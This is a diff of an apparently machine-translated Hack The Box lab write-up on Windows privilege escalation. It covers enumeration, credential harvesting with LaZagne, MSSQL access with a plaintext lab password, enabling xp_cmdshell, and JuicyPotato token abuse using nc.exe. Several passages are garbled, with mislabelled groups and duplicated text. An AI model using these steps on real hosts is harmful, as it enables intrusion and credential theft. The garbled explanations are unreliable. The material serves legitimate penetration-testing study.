-<p><strong>Patches and updates</strong> if<code>systeminfo</code> The hot fix does not show up, it can be done via<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" rel="noreferrer" target="_blank">WMI-Command</a> Binaries and QFE (Quick Fix Engineering) to query for patches.</p>
+<p><strong>Patches and updates</strong> if <code>systeminfo</code> The hot fix does not show up, it can be done via<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" rel="noreferrer" target="_blank">WMI-Command</a> Binaries and QFE (Quick Fix Engineering) to query for patches.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; wmic qfe
 
 Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
@@ -3484,7 +3484,7 @@ WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:
 WINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\Administrator 3/30/2021 12:00:00 AM
 WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
 WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\Administrator 4/13/2021 12:00:00 AM</code></pre>
-<p><strong>Installed programs</strong> WMI can also be used to display installed software. This information can often lead us to hard-to-find vulnerabilities.<code>FileZilla</code>/<code>Putty</code> Waiting for installation? run<code>LaZagne</code> Check whether the credentials stored by these apps are installed. Additionally, some programs may be installed and run as vulnerable services.</p>
+<p><strong>Installed programs</strong> WMI can also be used to display installed software. This information can often lead us to hard-to-find vulnerabilities.<code>FileZilla</code>/<code>Putty</code> Waiting for installation? run <code>LaZagne</code> Check whether the credentials stored by these apps are installed. Additionally, some programs may be installed and run as vulnerable services.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; wmic product get name
 
 Name
@@ -3541,13 +3541,13 @@ netstat -ano | findstr:8080
 tasklist /svc | findstr 2400
 
 </code></pre>
-<p><strong>User &amp; Group information</strong> Users are often the weakest link in an organization, especially if the system is well configured and patched. It is critical to understand the users and groups in the system, specific group members who can provide administrator rights, the permissions of the current user, password policy information, and the logged-in users we may be targeting. We may think that the system has been strongly patched, but the user directory of the local administrators group has members who can browse it and contains files like<code>logins.xlsx</code> Such a password file, so it's easy to win.</p>
+<p><strong>User &amp; Group information</strong> Users are often the weakest link in an organization, especially if the system is well configured and patched. It is critical to understand the users and groups in the system, specific group members who can provide administrator rights, the permissions of the current user, password policy information, and the logged-in users we may be targeting. We may think that the system has been strongly patched, but the user directory of the local administrators group has members who can browse it and contains files like <code>logins.xlsx</code> Such a password file, so it's easy to win.</p>
 <p><strong>Logged-In Users</strong> It is always important to determine which users are logged into the system. Are they idle or active? Can we know for sure what they are doing? Although more challenging to execute, sometimes we can directly attack the user to escalate privileges or gain more access. In evasive engagement, we need to move carefully on the host while other users are doing it to avoid detection.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; query user
 
  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 &gt;administrator         rdp-tcp#2           1  Active.  3/25/2021 9:27 AM</code></pre>
-<p><strong>Current User</strong> When we access the host, we should first check the user environment in which the account is running. Sometimes, we are already systems or equal beings! Assume we gain access as a service account. In this case we might have something like<code>SeImpersonatePrivilege</code> Such permissions, which are often easily abused, use<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a> Wait for tools to upgrade permissions.</p>
+<p><strong>Current User</strong> When we access the host, we should first check the user environment in which the account is running. Sometimes, we are already systems or equal beings! Assume we gain access as a service account. In this case we might have something like <code>SeImpersonatePrivilege</code> Such permissions, which are often easily abused, use<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a> Wait for tools to upgrade permissions.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; echo %USERNAME%
 
 htb-student </code></pre>
@@ -3580,7 +3580,7 @@ NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory g
 LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</code></pre>
-<p><strong>Get all users</strong> It's also important to know the other users on the system. If we pass for user<code>bob</code> The captured credentials gain RDP access to the host and are seen in the local Administrators group<code>bob_adm</code> Users, it is worth checking whether credentials are reused. Can we access the user profile directories of important users? We may find valuable files, such as scripts with passwords or SSH keys, on the user's desktop, Documents, or Downloads folder.</p>
+<p><strong>Get all users</strong> It's also important to know the other users on the system. If we pass for user <code>bob</code> The captured credentials gain RDP access to the host and are seen in the local Administrators group <code>bob_adm</code> Users, it is worth checking whether credentials are reused. Can we access the user profile directories of important users? We may find valuable files, such as scripts with passwords or SSH keys, on the user's desktop, Documents, or Downloads folder.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; net user
 
 User accounts for \\WINLPE-SRV01
@@ -3649,7 +3649,7 @@ Lockout observation window (minutes):                 30
 Computer role:                                        SERVER
 The command completed successfully.</code></pre>
 <h3>Interact with processes</h3>
-<p>One of the best places to look for privilege escalation is in the processes running on your system. Even if a process is not running as administrator, it may gain additional privileges. The most common example is to find a web server like IIS or XAMPP running on the host and place<code>aspx/php</code> shell and obtain a shell as the user running the web server. Typically, this is not the administrator, but there will usually be<code>SeImpersonate</code> token, allow<code>Rogue/Juicy/Lonely Potato</code> Provide system permissions.</p>
+<p>One of the best places to look for privilege escalation is in the processes running on your system. Even if a process is not running as administrator, it may gain additional privileges. The most common example is to find a web server like IIS or XAMPP running on the host and place <code>aspx/php</code> shell and obtain a shell as the user running the web server. Typically, this is not the administrator, but there will usually be <code>SeImpersonate</code> token, allow <code>Rogue/Juicy/Lonely Potato</code> Provide system permissions.</p>
 <p><strong>Access Tokens Access Tokens</strong> In Windows, an access token is used to describe the security context (security attributes or rules) of a process or thread. The token contains user account identity information and permissions associated with a specific process or thread. When a user authenticates to the system, their password is verified against the secure database, and if authenticated correctly, they are issued an access token. Whenever a user interacts with a process, a copy of this token is displayed to determine their permission level.</p>
 <h3>Enumerate network services</h3>
 <p>The most common way people interact with processes is through network sockets (DNS, HTTP, SMB, etc.).<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" rel="noreferrer" target="_blank">netstat</a> The command displays current TCP and UDP connections, which gives us a better idea of which services are listening on local and externally accessible ports. We may find a vulnerable service that can only be accessed after logging in to the local host, which can be used to escalate privileges.</p>
@@ -3709,7 +3709,7 @@ Active Connections
   UDP    0.0.0.0:3389           *:*                                    936
 
 &lt;SNIP&gt;</code></pre>
-<p>When using active network connections, the main thing to pay attention to is those on the loopback address (<code>127.0.0.1</code> and<code>:: 1</code>) that do not have a listening IP address (<code>10.129.43.8</code>) or broadcast address (<code>0.0.0.0</code>, <code>:: /0</code>). The reason is that network sockets on localhost are generally not secure because people think "they are not accessible from the network". The most obvious is<code>14147</code> Port number, used for FileZilla’s management interface. By connecting to this port, it may be possible to extract the FTP password, in addition to creating the c:\ of the f. P share as the FileZilla server user (possibly the administrator).</p>
+<p>When using active network connections, the main thing to pay attention to is those on the loopback address (<code>127.0.0.1</code> and <code>:: 1</code>) that do not have a listening IP address (<code>10.129.43.8</code>) or broadcast address (<code>0.0.0.0</code>, <code>:: /0</code>). The reason is that network sockets on localhost are generally not secure because people think "they are not accessible from the network". The most obvious is <code>14147</code> Port number, used for FileZilla’s management interface. By connecting to this port, it may be possible to extract the FTP password, in addition to creating the c:\ of the f. P share as the FileZilla server user (possibly the administrator).</p>
 <h3>named pipe</h3>
 <p>Another way of communication between processes is through named pipes. Pipes are essentially files stored in memory that are cleared after reading. Cobalt Strike for each command (excluding<a href="https://www.cobaltstrike.com/help-beacon-object-files" rel="noreferrer" target="_blank">BOF</a>) using named pipes. The workflow is basically as follows:</p>
 <p>The beacon started a pipe named \.\pipe\ msagent_12</p>
@@ -3717,7 +3717,7 @@ Active Connections
 <p>Server shows what is written to \.\pipe\ msagent_12</p>
 <ol><li>Beacon starts a named pipe of \.\pipe\msagent_12</li><li>Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12</li><li>Server displays what was written into \.\pipe\msagent_12</li></ol>
 <p>This is done because if the command being executed is flagged by antivirus or crashes, it will not affect the beacon (the process that executed the command). Cobalt Strike users often replace named pipes to disguise themselves as another program. One of the most common examples is using mojo instead of msagent. One of my favorite discoveries was finding a named pipe launcher with Mojo, but the computer itself didn't have Chrome installed. Luckily, that’s exactly what the company’s internal red team does. It says a lot when outside consultants find the red team, but the internal blue team doesn’t.</p>
-<p>Pipes are used for communication between two applications or processes, using shared memory. Pipes are divided into two types, named pipes and anonymous pipes. An example of a named pipe is<code>\\.\PipeName\\ExampleNamedPipeServer</code>. Windows systems use client-server for piped communication. In this implementation, the process that creates the named pipe is the server, and the process that communicates with the named pipe is the client. Named pipes can be accessed via<code>half-duplex</code>Communication, or one-way channel, where the client can only write data to the server; or dual<code>duplex</code>, a two-way communication channel that allows the client to write data through a pipe and the server to respond with data through the pipe. Each active connection to the named pipe server generates a new named pipe. These pipes have the same name but communicate through different data buffers.</p>
+<p>Pipes are used for communication between two applications or processes, using shared memory. Pipes are divided into two types, named pipes and anonymous pipes. An example of a named pipe is <code>\\.\PipeName\\ExampleNamedPipeServer</code>. Windows systems use client-server for piped communication. In this implementation, the process that creates the named pipe is the server, and the process that communicates with the named pipe is the client. Named pipes can be accessed via <code>half-duplex</code> Communication, or one-way channel, where the client can only write data to the server; or dual <code>duplex</code>, a two-way communication channel that allows the client to write data through a pipe and the server to respond with data through the pipe. Each active connection to the named pipe server generates a new named pipe. These pipes have the same name but communicate through different data buffers.</p>
 <p><strong>List named pipes with pipe list</strong></p>
 <pre><code class="language-cmd-session">C:\htb&gt; pipelist.exe /accepteula
 
@@ -3751,7 +3751,7 @@ ROUTER                                            3               -1
 vmware-authdpipe                                  1                1
 
 &lt;SNIP&gt;</code></pre>
-<p>Additionally, we can use PowerShell to use<code>gci</code> (<code>Get-ChildItem</code>) lists named pipes.</p>
+<p>Additionally, we can use PowerShell to use <code>gci</code> (<code>Get-ChildItem</code>) lists named pipes.</p>
 <p><strong>List named pipes with PowerShell</strong></p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt;  gci \\.\pipe\
 
@@ -3783,7 +3783,7 @@ Mode                LastWriteTime         Length Name
 ------       12/31/1600   4:00 PM              3 epmapper
 
 &lt;SNIP&gt;</code></pre>
-<p>Once we have the list of named pipes, we can use<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">Accesschk</a> Enumerate permissions for a specific named pipe by looking at the Discretionary Access List (DACL), which shows who has permission to modify, write, read, or execute the resource. let's take a look<code>LSASS</code> process. We can also use the command<code>.\accesschk.exe /accepteula \pipe\</code> to inspect the DACL of all named pipes.</p>
+<p>Once we have the list of named pipes, we can use<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">Accesschk</a> Enumerate permissions for a specific named pipe by looking at the Discretionary Access List (DACL), which shows who has permission to modify, write, read, or execute the resource. let's take a look <code>LSASS</code> process. We can also use the command <code>.\accesschk.exe /accepteula \pipe\</code> to inspect the DACL of all named pipes.</p>
 <h2>User permissions</h2>
 <p>The permissions in mean that the account can be granted the right to perform various operations on the local system, such as managing services, loading drivers, shutting down the system, debugging applications, etc. Permissions are different from access rights, which are used by the system to grant or deny access to protectable objects. User and group permissions are stored in the database and are granted via access tokens when users log into the system. Accounts can have local permissions on specific computers, or have different permissions on different systems if the account belongs to an Active Directory domain. Whenever a user attempts to perform a privileged operation, the system checks the user's access token to confirm whether the account has the required permissions and, if so, whether those tokens are enabled. Most permissions are disabled by default. Some can be enabled by opening an administrative cmd.exe or PowerShell console, while others can be enabled manually.</p>
 <p>The goal of the assessment is typically to gain administrative access to one or more systems. Suppose we can log into the system as a user with specific permissions. In this case, we may be able to leverage built-in functionality to directly escalate privileges, or leverage the privileges assigned to the target account to further escalate access to achieve our ultimate goal.</p>
@@ -3791,10 +3791,10 @@ Mode                LastWriteTime         Length Name
 <p>The following diagram explains at a high level the Windows authorization and access control process, which begins when a user attempts to access a securable object (such as a folder) in a file share. During this process, the user's access token (including its user SID, the SID of the group it belongs to, permission lists, and other access information) is compared to access control entries (ACEs) within the object's security descriptor (ACEs contain security information that protects the object, such as the access rights granted to the user or group, discussed below). Once the comparison is complete, a decision is made whether to grant access. Whenever a user attempts to access a resource on a Windows host, the entire process occurs almost instantaneously. As part of our enumeration and privilege escalation campaigns, we attempt to exploit and abuse access, leveraging or intervening in this authorization process to further advance access to targets.</p>
 <img alt="Pasted image 20260228022956" src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png"/>
 <p><strong>Rights and Privileges in Windows, Rights and Privileges</strong> Windows contains many groups that give their members powerful rights and privileges. Many of these can be abused to escalate privileges in both standalone Windows hosts and Active Directory domain environments. Ultimately, these resources can be used to gain domain administrator, local administrator, or system privileges on a Windows workstation, server, or domain controller (DC). Some of these groups are listed below.</p>
-<div class="post-table-wrap"><table><thead><tr><th><strong>Group Group</strong></th><th><strong>Description Description</strong></th></tr></thead><tbody><tr><td>Default administrator</td><td>Domain Administrators and Enterprise Administrators are "super" groups.</td></tr><tr><td>server operator</td><td>Members can modify services, access SMB shares, and backup files.</td></tr><tr><td>Spare</td><td>Members can log into the DC locally and should be considered domain administrators. They can make shadow copies of SAM/NTDS databases, read the registry remotely, and access file systems on the DC via SMB. This group sometimes joins a non-DC local backup group.</td></tr><tr><td>Print</td><td>Members can log into a local DC and "trick" Windows into loading a malicious driver.</td></tr><tr><td>Administrator</td><td>If a virtual datacenter exists, any virtualization administrator, such as a member of the Hyper-V Administrators, should be considered a domain administrator.</td></tr><tr><td>Account Operator</td><td>Members can modify non-protected accounts and groups within the domain.</td></tr><tr><td>remote desktop user</td><td>Members do not have any useful permissions by default, but are often granted additional permissions<code>Allow Login Through Remote Desktop Services</code>, for example, and can enable lateral movement via the RDP protocol.</td></tr><tr><td>Remotely manage users</td><td>Members can log into the DC via PSRemoting (the group is sometimes joined to a non-DC's local remote management group).</td></tr><tr><td>Group Policy Creator Owner</td><td>Members can create new GPOs, but need to be granted additional permissions to associate the GPO to a container, such as a domain or OU.</td></tr><tr><td>Schema manager</td><td>Members can modify the Active Directory schema structure by adding compromised accounts to the default object ACL and backdoor any Group/GPO to be created.</td></tr><tr><td>Administrator</td><td>Members can load DLLs on the DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL often causes the service to crash. A more reliable way to tap into this group is to create a WPAD record.</td></tr></tbody></table></div>
+<div class="post-table-wrap"><table><thead><tr><th><strong>Group Group</strong></th><th><strong>Description Description</strong></th></tr></thead><tbody><tr><td>Default administrator</td><td>Domain Administrators and Enterprise Administrators are "super" groups.</td></tr><tr><td>server operator</td><td>Members can modify services, access SMB shares, and backup files.</td></tr><tr><td>Spare</td><td>Members can log into the DC locally and should be considered domain administrators. They can make shadow copies of SAM/NTDS databases, read the registry remotely, and access file systems on the DC via SMB. This group sometimes joins a non-DC local backup group.</td></tr><tr><td>Print</td><td>Members can log into a local DC and "trick" Windows into loading a malicious driver.</td></tr><tr><td>Administrator</td><td>If a virtual datacenter exists, any virtualization administrator, such as a member of the Hyper-V Administrators, should be considered a domain administrator.</td></tr><tr><td>Account Operator</td><td>Members can modify non-protected accounts and groups within the domain.</td></tr><tr><td>remote desktop user</td><td>Members do not have any useful permissions by default, but are often granted additional permissions <code>Allow Login Through Remote Desktop Services</code>, for example, and can enable lateral movement via the RDP protocol.</td></tr><tr><td>Remotely manage users</td><td>Members can log into the DC via PSRemoting (the group is sometimes joined to a non-DC's local remote management group).</td></tr><tr><td>Group Policy Creator Owner</td><td>Members can create new GPOs, but need to be granted additional permissions to associate the GPO to a container, such as a domain or OU.</td></tr><tr><td>Schema manager</td><td>Members can modify the Active Directory schema structure by adding compromised accounts to the default object ACL and backdoor any Group/GPO to be created.</td></tr><tr><td>Administrator</td><td>Members can load DLLs on the DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL often causes the service to crash. A more reliable way to tap into this group is to create a WPAD record.</td></tr></tbody></table></div>
 <p><strong>User rights transfer</strong> Users may have various permissions assigned to their accounts based on other factors such as group membership and permissions assigned through domain and local group policy. This Microsoft article about user rights transfer details each user permission that can be set in Windows and the security considerations that apply to each permission. Below are some key user rights assignments that apply to localhost. These permissions allow users to perform tasks on the system, such as logging in locally or remotely, accessing the host from the network, shutting down the server, etc.</p>
 <div class="post-table-wrap"><table><thead><tr><th>Set constant</th><th>Set name</th><th>Standard work</th><th>Description</th></tr></thead><tbody><tr><td>SeNetworkLogonRight</td><td>Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)</td><td>Administrator, authenticated user</td><td>Decide which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.</td></tr><tr><td>SeRemoteInteractiveLogonRight</td><td>Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)</td><td>Administrator, Remote Desktop User</td><td>This policy setting determines which users or groups can access the login interface of a remote device through a Remote Desktop Services connection. Users can establish a Remote Desktop Services connection to a specific server, but cannot log in to the server's console.</td></tr><tr><td>SeBackupPrivilege  SeeBackupPrivilege</td><td>Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)</td><td>managers</td><td>This user permission determines which users can bypass file and directory, registry, and other persistent object permissions to back up the system.</td></tr><tr><td>SeSecurityPrivilege</td><td>Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)</td><td>managers</td><td>This policy setting determines which users can specify object access auditing options for individual resources, such as files, Active Directory objects, and registry keys. These objects have their system access control lists (SACLs) specified. Users granted this user permission can also view and clear the security log in Event Viewer.</td></tr><tr><td>privilege</td><td>take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)</td><td>managers</td><td>This policy setting determines which users can own any protectable object on the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.</td></tr><tr><td>SeDebugPrivilege</td><td>debugger</td><td>managers</td><td>This policy setting determines which users can connect to or open any process, even processes they do not own. Developers debugging applications do not need this user permission. Developers debugging new system components need this user right. This user right allows access to sensitive and critical operating system components.</td></tr><tr><td>Pretending to be privileged</td><td>Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)</td><td>Administrator, local service, network service, service</td><td>This policy setting determines which programs can impersonate the user or other specified accounts and act on the user's behalf.</td></tr><tr><td>SeLoadDriverPrivilege</td><td>Loading and unloading device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)</td><td>managers</td><td>This policy setting determines which users can dynamically load and unload device drivers. If there is already a signed driver for the new hardware in the driver.cab file on the device, you do not need to use this user right. Device drivers run as high-privilege code.</td></tr><tr><td>SeRestorePrivilege  SeeRestorePrivilege</td><td>Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)</td><td>managers</td><td>This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when restoring backup files and directories. It determines which users can set valid security principals as owners of the object.</td></tr><tr><td>privilege</td><td>As part of the operating system](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system)</td><td>Administrator, local service, network service, service</td><td>This security setting determines whether a process can assume the identity of any user and thereby obtain the resources that the target user is allowed to access (impersonation). This may be assigned to an antivirus or backup tool that requires access to all system files for scanning or backup. This permission should be reserved for service accounts that require legitimate access.</td></tr></tbody></table></div>
-<p>Enter command<code>whoami /priv</code> A list of all user permissions assigned to your current user will be displayed. Some permissions are only open to administrator users and can only be listed or exploited when running elevated commands or PowerShell sessions. These concepts of elevated privileges and User Account Control (UAC) are security features introduced in Windows Vista that by default restrict applications from running with full privileges unless necessary. If we compare the rights an administrator has on a non-elevated console and an upgraded console, we see that they differ significantly.</p>
+<p>Enter command <code>whoami /priv</code> A list of all user permissions assigned to your current user will be displayed. Some permissions are only open to administrator users and can only be listed or exploited when running elevated commands or PowerShell sessions. These concepts of elevated privileges and User Account Control (UAC) are security features introduced in Windows Vista that by default restrict applications from running with full privileges unless necessary. If we compare the rights an administrator has on a non-elevated console and an upgraded console, we see that they differ significantly.</p>
 <p>The following are the permissions available to the local administrator account on Windows systems</p>
 <p><strong>Local Administrator User Privileges - Elevate</strong></p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami 
@@ -3833,7 +3833,7 @@ SeIncreaseWorkingSetPrivilege             Increase a process working set        
 SeTimeZonePrivilege                       Change the time zone                                               Disabled
 SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled </code></pre>
-<p>When our account is<code>Disabled</code> " status, it means that our account has that privilege. However, until it is enabled, it cannot be used with an access token to perform related actions. Windows does not have built-in commands or PowerShell cmdlets to enable permissions, so we need some scripts to help. In this module, we will see ways to abuse various privileges, and various ways to implement specific privileges in the current process. An example is this PowerShell script, which can be used to enable certain permissions, or this script can be used to adjust token permissions.</p>
+<p>When our account is <code>Disabled</code> " status, it means that our account has that privilege. However, until it is enabled, it cannot be used with an access token to perform related actions. Windows does not have built-in commands or PowerShell cmdlets to enable permissions, so we need some scripts to help. In this module, we will see ways to abuse various privileges, and various ways to implement specific privileges in the current process. An example is this PowerShell script, which can be used to enable certain permissions, or this script can be used to adjust token permissions.</p>
 <p>In comparison, ordinary users have few permissions</p>
 <p><strong>Ordinary user rights</strong></p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami 
@@ -3865,12 +3865,12 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pr
 <p><strong>Detection</strong></p>
 <p>This <a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e" rel="noreferrer" target="_blank">post</a> is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672" rel="noreferrer" target="_blank">4672: Special privileges assigned to new logon</a> which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts. This article is worth reading to learn more about Windows Permissions and information to detect and prevent abuse, in particular by logging event 4672: Special permissions assigned to new logins, which is an event raised if a new login session is assigned certain sensitive permissions. This can be fine-tuned in a number of ways, such as monitoring permissions that should not be assigned, or permissions that should only be assigned to specific accounts.</p>
 <h3>SeImpersonate and SeAssignPrimaryToken permissions</h3>
-<p>In Windows, each process has a token that contains information about the account under which it runs. These tokens are not considered secure resources as they are simply memory locations in memory that can be brute-forced by a user who cannot read the memory. To use this token, you need to have<code>impersonation</code>privilege. This protection is only granted to administrative accounts and in most cases can be removed during the system hardening process. An example of using this token is<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a>.</p>
-<p>A legitimate program can leverage the token of another process to escalate from administrator to the local system, which has additional privileges. A process typically obtains a SYSTEM token by calling the WinLogon process, then executes itself with the token and places it in SYSTEM space. Attackers often abuse this permission in "potato-style" private accounts - service accounts can<code>impersonation</code>, but cannot obtain full system-level permissions. Essentially, the Potato attack tricks a process running as SYSTEM into connecting to its own process and handing over a token for use.</p>
+<p>In Windows, each process has a token that contains information about the account under which it runs. These tokens are not considered secure resources as they are simply memory locations in memory that can be brute-forced by a user who cannot read the memory. To use this token, you need to have <code>impersonation</code> privilege. This protection is only granted to administrative accounts and in most cases can be removed during the system hardening process. An example of using this token is<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a>.</p>
+<p>A legitimate program can leverage the token of another process to escalate from administrator to the local system, which has additional privileges. A process typically obtains a SYSTEM token by calling the WinLogon process, then executes itself with the token and places it in SYSTEM space. Attackers often abuse this permission in "potato-style" private accounts - service accounts can <code>impersonation</code>, but cannot obtain full system-level permissions. Essentially, the Potato attack tricks a process running as SYSTEM into connecting to its own process and handing over a token for use.</p>
 <p>We typically obtain this permission after gaining remote code execution through an application running in the context of a service account (for example, uploading a web shell to a web app in ASP. NET, remote code execution through a Jenkins installation, or executing commands through an MSSQL query). Whenever we gain access in this way, we should immediately check for permissions, as its presence often provides a quick and easy way to gain higher privileges. This article is worth reading to learn more details about token impersonation attacks.</p>
 <p><strong>Selmpersonate Example - JuicyPotato</strong>Let's take the following example where we gain a foothold on the SQL server via a privileged SQL user. Clients can be configured to use Windows authentication when connecting to IIS and SQL Server. The server may then need to access other resources, such as file shares, as a connecting client. This can be achieved by impersonating the context user established by the client connection. For this purpose, the service account will be authorized to "impersonate the client" after authenticating the permissions.</p>
-<p>In this case, the SQL Service service account runs under the default<code>mssqlserver</code> in the account context. Imagine we go through<code>Snaffler</code> The tool implements command execution, and users use<code>xp_cmdshell</code> Obtained from file sharing<code>logins.sql</code> A set of credentials in a file.</p>
-<p>Utilize credentials<code>sql_dev: Str0ng_P@ssw0rd！</code>, we first connect to the SQL server instance and confirm permissions. we can use<code>Impacket</code> in toolkit<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" rel="noreferrer" target="_blank">mssqlclient.py</a> to achieve this.</p>
+<p>In this case, the SQL Service service account runs under the default <code>mssqlserver</code> in the account context. Imagine we go through <code>Snaffler</code> The tool implements command execution, and users use <code>xp_cmdshell</code> Obtained from file sharing <code>logins.sql</code> A set of credentials in a file.</p>
+<p>Utilize credentials <code>sql_dev: Str0ng_P@ssw0rd！</code>, we first connect to the SQL server instance and confirm permissions. we can use <code>Impacket</code> in toolkit<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" rel="noreferrer" target="_blank">mssqlclient.py</a> to achieve this.</p>
 <ol><li>Connecting with MSSQLClient.py</li></ol>
 <pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-mssqlclient sql_dev@10.129.28.157 -windows-auth
 
@@ -3886,7 +3886,7 @@ Password:
 [*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
 [!] Press help for extra shell commands
 SQL&gt;</code></pre>
-<p>Next we have to enable<code>xp_cmdshell</code> Stored procedures to run operating system commands. We can do this by typing<code>enable_xp_cmdshell</code> To implement the Impacket MSSSQL shell. input<code>help</code>Some additional command options are displayed.</p>
+<p>Next we have to enable <code>xp_cmdshell</code> Stored procedures to run operating system commands. We can do this by typing <code>enable_xp_cmdshell</code> To implement the Impacket MSSSQL shell. input <code>help</code> Some additional command options are displayed.</p>
 <ol><li>Enabling xp_cmdshell</li></ol>
 <pre><code class="language-shell-session">SQL&gt; enable_xp_cmdshell
 
@@ -3922,8 +3922,8 @@ SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
 SeCreateGlobalPrivilege       Create global objects                     Enabled    
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </code></pre>
-<p>command<code>whoami /priv</code> Confirm<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a> has been listed. This privilege can be used to impersonate e.g.<code>NT AUTHORITY\SYSTEM</code> and other privileged accounts.<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">JuicyPotato</a> Can be exploited via DCOM/NTLM reflection abuse<code>SeImpersonate</code> or<code>SeAssignPrimaryToken</code> permissions.</p>
-<p>In order to take advantage of these permissions to escalate privileges, first download<code>JuicyPotato.exe</code> binary file and upload it, and<code>nc.exe</code> to the target server. Next, create a Netcat listener on port 8443 and execute the following command, where<code>-l</code> is the COM server listening port,<code>-p</code> Is the startup program (cmd.exe),<code>-a</code> are the parameters passed to cmd.exe,<code>-t</code> Yes<code>createprocess</code> call. Below, we tell the tool to try both<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a> and<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera" rel="noreferrer" target="_blank">CreateProcessAsUser</a> function, both of which require<code>SeImpersonate</code> or<code>SeAssignPrimaryToken</code> permissions.</p>
+<p>command <code>whoami /priv</code> Confirm<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a> has been listed. This privilege can be used to impersonate e.g.<code>NT AUTHORITY\SYSTEM</code> and other privileged accounts.<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">JuicyPotato</a> Can be exploited via DCOM/NTLM reflection abuse <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> permissions.</p>
